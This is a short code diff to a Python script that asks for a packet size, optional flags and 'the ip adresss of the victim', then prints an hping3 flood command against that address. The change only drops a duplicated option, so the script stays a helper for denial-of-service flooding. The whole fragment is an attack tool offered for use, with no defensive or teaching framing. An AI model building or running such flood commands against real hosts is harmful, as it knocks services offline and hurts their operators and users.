@@ -20,4 +20,4 @@ saved_data = input ("for the -d options(-d=how much data sent), how much data u 
 saved_s_i = input ("do you want the -S -i option?(if no dont put anything and if you want it type '-S -i': \n")
 saved_ip_adress = input ("whats the ip adresss of the victim? : \n")
 
-print("sudo hping3 -d " + saved_data + " " + saved_s_i + " -S -i --flood " + saved_ip_adress)
+print("sudo hping3 -d " + saved_data + " " + saved_s_i + " --flood " + saved_ip_adress)
